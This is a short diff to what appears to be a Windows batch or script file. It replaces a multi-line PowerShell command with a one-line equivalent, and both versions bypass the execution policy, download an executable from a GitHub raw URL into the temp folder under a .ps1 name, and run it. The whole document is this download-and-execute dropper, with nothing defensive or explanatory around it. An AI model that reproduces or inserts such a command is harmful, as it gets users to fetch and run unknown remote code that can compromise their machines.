@@ -1,5 +1,1 @@
-powershell -ExecutionPolicy Bypass -Command ^
-"$url='https://github.com/no123ex/tes/raw/refs/heads/main/WinFormsApp.exe'; ^
-$path=\"$env:TEMP\script.ps1\"; ^
-Invoke-WebRequest $url -UseBasicParsing -OutFile $path; ^
-& $path"
+powershell -ExecutionPolicy Bypass -Command "$path = Join-Path $env:TEMP 'script.ps1'; Invoke-WebRequest 'https://github.com/no123ex/tes/raw/refs/heads/main/WinFormsApp.exe' -UseBasicParsing -OutFile $path; & $path"
